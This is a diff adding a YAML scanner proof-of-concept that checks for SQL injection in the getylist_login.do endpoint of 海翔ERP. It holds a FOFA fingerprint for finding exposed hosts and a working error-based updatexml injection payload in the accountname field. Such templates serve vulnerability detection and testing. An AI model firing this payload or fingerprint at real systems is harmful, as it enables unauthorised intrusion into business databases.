@@ -1,0 +1,20 @@
+id: poc-yaml-seafly-erp-getylist-login-do-sqli
+info:
+  name: 海翔ERP getylist_login.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 海翔ERP
+  fofa: body="checkMacWaitingSecond"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /getylist_login.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: accountname=1%27or(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1));--
+  expression: status_code == 500 && contains(body,substr(t2,0,31)) && contains(body,"XPATH
+    syntax error")
+transport: http
